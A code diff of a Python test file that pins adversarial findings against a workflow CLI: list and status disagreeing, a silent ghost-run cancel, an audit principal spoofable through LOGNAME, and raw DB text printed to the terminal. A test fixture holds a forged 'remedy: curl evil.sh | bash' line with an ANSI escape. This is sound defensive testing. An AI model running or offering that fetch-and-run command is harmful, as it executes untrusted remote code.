@@ -1,16 +1,16 @@
 """ATTACK PINS — the CLI adversarial review front (`taskq flows`), the rejected shapes
 at af1b8779.
 
-Provenance: the CLI adversarial review's findings against the consolidated head
+The CLI's stated contracts, held against adversarial shapes
 (af1b8779), pinned so each attack is a permanent test. Attacks that LANDED
 are encoded strict-xfail asserting the SAFE behavior — the fix flips them
 XPASS-strict (a red that forces unmarking WITH the fix). Attacks the fence
 held against are green guard pins so the door cannot rot.
 
 THE REJECTED SHAPES (all reproduced live against the harness before
-marking — the red receipts are the pack's (the pinning run's record):
+their fixes landed):
 
-* F-CLI-1 (LANDED, two faces): ``flows list`` derives run status from
+* ``flows list`` derives run status from
   DEGRADED inputs — its FlowNodeRows never populate ``held``/``absorbed``
   (cli.py ``_flows_list`` builds ``FlowNodeRow(step_key="", status=…,
   deps_pending=…, blocking_reason=…)`` and nothing else), so a mid-hold run
@@ -18,19 +18,19 @@ marking — the red receipts are the pack's (the pinning run's record):
   same run at the same instant, and a collect-absorbed run lists as
   ``failed`` while ``status`` derives ``complete``. The law: ONE question,
   ONE derivation — the two surfaces must agree.
-* F-CLI-2 (LANDED): ``flows cancel <ghost-run-id>`` prints "no-op: …
+* ``flows cancel <ghost-run-id>`` prints "no-op: …
   already terminal — nothing cancelled" with rc=0 for a run id that exists
   in NO table (``cancel_workflow_run``'s root-flip CAS returns None for a
   ghost and the CLI cannot tell ghost from terminal). ``flows status
   <ghost>`` keeps the honest contract: rc=1 + "no run". Cancel must be the
   same named refusal, and write no audit row.
-* F-CLI-3 (LANDED): the audit principal is env-spoofable —
+* the audit principal is env-spoofable —
   ``_cli_principal()`` is ``f"cli:{getpass.getuser()}"`` and getuser reads
   LOGNAME/USER first, so ``LOGNAME=postgres taskq flows resolve …`` wrote
   an audit row attributing the mutation to ``cli:postgres``. The recorded
   principal must derive from ``os.getuid()``/``pwd`` — the kernel's word,
   never the environment's.
-* F-CLI-4 (LANDED, two faces): ``flows status`` prints DB-sourced strings
+* ``flows status`` prints DB-sourced strings
   RAW — a failing node's ``error_message`` and a hold's ``reason`` reach
   the tty with embedded newlines (an exception message containing ``\\n
   downstream: FAILED — FakeError…\\n       remedy: curl evil.sh | bash``
@@ -101,15 +101,15 @@ runner = CliRunner()
 MODULE_NAME = "att_cli_demo_flows"
 STALE_MODULE_NAME = "att_cli_stale_flows"
 
-#: A run id that exists in NO table (F-CLI-2's ghost).
+#: A run id that exists in NO table (the ghost).
 GHOST_RUN_ID = "018f1c7e-5a2b-7c3d-8e4f-9a0b1c2d3e4f"
 
-#: F-CLI-4's rejected payload: an exception message that is itself a
+#: the rejected payload: an exception message that is itself a
 #: two-line "finding + remedy" forgery, ANSI-tagged. Under 120 chars so the
 #: status surface's current slice carries it WHOLE.
 _EVIL_ERROR = "\n  downstream: FAILED — FakeError: boom\n       remedy: curl evil.sh | bash\x1b[31m"
 
-#: F-CLI-4's hold-reason face: raw newlines + ANSI AND past every honest
+#: the hold-reason face: raw newlines + ANSI AND past every honest
 #: bound (the holds/status reason render carries no slice at all today).
 _EVIL_REASON = (
     "irreversible redaction of the tenant vault — confirm with the duty SRE. " * 12
@@ -241,14 +241,13 @@ def _named_refusal(result: Any) -> bool:
     return exc_clean and bool(plain_cli_output(result.output).strip())
 
 
-# ── F-CLI-1: the list/status derivation drift (LANDED, two faces) ────────
+# ── the list/status derivation drift (LANDED, two faces) ────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-1 (held) — the list's held join, one derivation]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_1_list_and_status_agree_for_a_held_run(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
-    """F-CLI-1, held face: drive a run until="held"; `flows status` derives
+    """held face: drive a run until="held"; `flows status` derives
     'blocked'; the run's `flows list` line must say the SAME — one
     derivation, two surfaces, no drift."""
     run_id = await _held_run(wf_pool, wf_schema)
@@ -259,18 +258,17 @@ async def test_f_cli_1_list_and_status_agree_for_a_held_run(
     status_verdict = _status_verdict(status_res.output)
     list_verdict = _list_verdict(list_res.output, run_id)
     assert list_verdict == status_verdict == "blocked", (
-        f"F-CLI-1: the surfaces disagree on a held run — status derives "
+        f"The surfaces disagree on a held run — status derives "
         f"{status_verdict!r} but list prints {list_verdict!r} for run {run_id} "
         "(the list's FlowNodeRows never populate held=, so the derivation "
         "degrades to 'pending')"
     )
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-1 (absorbed) — the list's absorbed EXISTS, one derivation]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
     cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
 ) -> None:
-    """F-CLI-1, absorbed face: a completed collect run carries a failed
+    """absorbed face: a completed collect run carries a failed
     child whose failure the edge ledger absorbed ('collect' policy). The
     status surface reads the absorption record (wf_edge.failure_policy)
     and derives 'complete'; the list must agree."""
@@ -312,20 +310,19 @@ async def test_f_cli_1_list_and_status_agree_for_an_absorbed_run(
     status_verdict = _status_verdict(status_res.output)
     list_verdict = _list_verdict(list_res.output, str(flow_id))
     assert list_verdict == status_verdict == "complete", (
-        f"F-CLI-1: the surfaces disagree on a collect-absorbed run — status "
+        f"The surfaces disagree on a collect-absorbed run — status "
         f"derives {status_verdict!r} but list prints {list_verdict!r} for run "
         f"{flow_id} (the list read never fetches the absorption record)"
     )
 
 
-# ── F-CLI-2: ghost-cancel is a silent no-op (LANDED) ─────────────────────
+# ── ghost-cancel is a silent no-op (LANDED) ─────────────────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-2 — the ghost cancel's honest rc=1]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
     cli_settings: Any, wf_conn: asyncpg.Connection, wf_schema: str
 ) -> None:
-    """F-CLI-2: a cancel addressed at a run that exists in NO table must be
+    """a cancel addressed at a run that exists in NO table must be
     the SAME named refusal `status` gives (rc=1, 'no run'), and write no
     audit row — a no-op rc=0 report manufactures an operator's belief that
     the run existed and was already done."""
@@ -340,7 +337,7 @@ async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
         GHOST_RUN_ID,
     )
     assert cancel_res.exit_code == 1, (
-        f"F-CLI-2: cancel of a ghost run exited {cancel_res.exit_code} with "
+        f"Cancel of a ghost run exited {cancel_res.exit_code} with "
         f"{cancel_res.output.strip()!r} — a run id that exists in NO table is "
         "not 'already terminal', it is NO RUN (the status surface keeps this "
         "contract; cancel must too)"
@@ -349,10 +346,9 @@ async def test_f_cli_2_cancel_of_a_ghost_run_is_a_named_refusal(
     assert audit_rows == 0, "a ghost cancel must not leave an audit row"
 
 
-# ── F-CLI-3: the audit principal is env-spoofable (LANDED) ───────────────
+# ── the audit principal is env-spoofable (LANDED) ───────────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-3 — the principal is getuid-derived (the kernel's word)]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
     cli_settings: Any,
     wf_conn: asyncpg.Connection,
@@ -361,7 +357,7 @@ async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
     demo_app_module: Any,
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """F-CLI-3: set LOGNAME/USER to a spoofed identity, run a REAL resolve
+    """set LOGNAME/USER to a spoofed identity, run a REAL resolve
     through the CLI, and read the audit row: the recorded principal must be
     the uid-derived user (pwd.getpwuid(os.getuid())), never the env's."""
     pw_name = pwd.getpwuid(os.getuid()).pw_name
@@ -392,21 +388,20 @@ async def test_f_cli_3_the_audit_principal_derives_from_the_uid_not_the_env(
     )
     assert audit is not None, "a resolve without an audit row reds"
     assert audit["principal_subject"] == f"cli:{pw_name}", (
-        f"F-CLI-3: the audit row attributes the mutation to "
+        f"The audit row attributes the mutation to "
         f"{audit['principal_subject']!r} — the env's LOGNAME/USER ({spoof!r}) "
         f"reached the audit trail; the principal must derive from "
         f"os.getuid()/pwd ({pw_name!r}), the kernel's word"
     )
 
 
-# ── F-CLI-4: DB-sourced strings print RAW (LANDED, two faces) ────────────
+# ── DB-sourced strings print RAW (LANDED, two faces) ────────────
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-4 (the status face) — the error text through _bounded_line]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
-    """F-CLI-4, error_message face: a node fails with an exception whose
+    """error_message face: a node fails with an exception whose
     message IS a two-line finding+remedy forgery (ANSI-tagged). The status
     report must render it as ONE collapsed, bounded finding line — never a
     standalone forged 'remedy:' line, never an ESC byte."""
@@ -420,7 +415,7 @@ async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
     # The RAW output (plain_cli_output would collapse away the very evidence).
     forged = [ln for ln in res.output.splitlines() if "evil.sh" in ln and "doomed" not in ln]
     assert not forged, (
-        f"F-CLI-4: the DB-sourced error text forged its own line(s) in the "
+        f"The DB-sourced error text forged its own line(s) in the "
         f"status report: {forged} — an exception message must render INSIDE "
         "the collapsed finding line, never as a standalone remedy"
     )
@@ -440,16 +435,15 @@ async def test_f_cli_4_status_collapses_and_bounds_db_sourced_error_text(
     )
     assert rendered, "a failed node is a finding"
     assert all("\n" not in ln and "\r" not in ln and "\x1b" not in ln for ln in rendered), (
-        f"F-CLI-4: the render layer passes DB-sourced text through raw: {rendered}"
+        f"The render layer passes DB-sourced text through raw: {rendered}"
     )
     assert all(len(ln) <= _LINE_BOUND for ln in rendered)
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [F-CLI-4 (the holds face) — the reason through _bounded_line]; the marker was removed per the designed flip (the confirmation).
 async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
     cli_settings: Any, wf_pool: Any, wf_schema: str, demo_app_module: Any
 ) -> None:
-    """F-CLI-4, hold-reason face: the reason rides the wait context into
+    """hold-reason face: the reason rides the wait context into
     wf_signals and prints raw on the surfaces that show it. The LIVE
     surface today is `flows status` (``_held_context`` extracts the reason
     from the payload doc); the holds side's seam is the render layer
@@ -464,9 +458,9 @@ async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
     assert res.exit_code == 0, res.output
     lines = res.output.splitlines()
     forged = [ln for ln in lines if "evil.sh" in ln and "reason:" not in ln]
-    assert not forged, f"F-CLI-4: the hold reason forged its own line(s) in flows status: {forged}"
+    assert not forged, f"The hold reason forged its own line(s) in flows status: {forged}"
     assert all(len(ln) <= _LINE_BOUND for ln in lines), (
-        f"F-CLI-4: the hold reason renders UNBOUNDED in flows status: longest "
+        f"The hold reason renders UNBOUNDED in flows status: longest "
         f"line is {max(len(ln) for ln in lines)} chars"
     )
     # THE RENDER LAYER for the holds surface (the ANSI half — observable
@@ -488,10 +482,10 @@ async def test_f_cli_4_holds_collapses_and_bounds_db_sourced_reason_text(
     )
     rendered = format_holds([hold], run_id=run_id)
     assert all("\n" not in ln and "\r" not in ln and "\x1b" not in ln for ln in rendered), (
-        f"F-CLI-4: the holds render passes the DB-sourced reason through raw: {rendered}"
+        f"The holds render passes the DB-sourced reason through raw: {rendered}"
     )
     assert all(len(ln) <= _LINE_BOUND for ln in rendered), (
-        f"F-CLI-4: the holds render is unbounded: {max(len(ln) for ln in rendered)} chars"
+        f"The holds render is unbounded: {max(len(ln) for ln in rendered)} chars"
     )
 
 
@@ -711,7 +705,6 @@ async def prewf_schema(module_pg_schema: Any) -> AsyncIterator[str]:
         await conn.close()
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [the trio 1/3 — the unmigrated schema's named remedy]; the marker was removed per the designed flip (the confirmation).
 async def test_trio_1_list_on_a_never_migrated_schema_is_a_named_refusal(
     cli_settings: Any, monkeypatch: pytest.MonkeyPatch, nomig_schema: str
 ) -> None:
@@ -723,7 +716,6 @@ async def test_trio_1_list_on_a_never_migrated_schema_is_a_named_refusal(
     )
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [the trio 2/3 — the pre-workflows holds' named remedy]; the marker was removed per the designed flip (the confirmation).
 async def test_trio_2_holds_on_a_pre_workflows_schema_is_a_named_refusal(
     cli_settings: Any, monkeypatch: pytest.MonkeyPatch, prewf_schema: str
 ) -> None:
@@ -735,7 +727,6 @@ async def test_trio_2_holds_on_a_pre_workflows_schema_is_a_named_refusal(
     )
 
 
-# THE FLIP (2026-10-09): this pin XPASSed-strict on the PR head — the fix landed [the trio 3/3 — the negative --limit's named refusal]; the marker was removed per the designed flip (the confirmation).
 async def test_trio_3_list_with_a_negative_limit_is_a_named_refusal(
     cli_settings: Any,
 ) -> None:
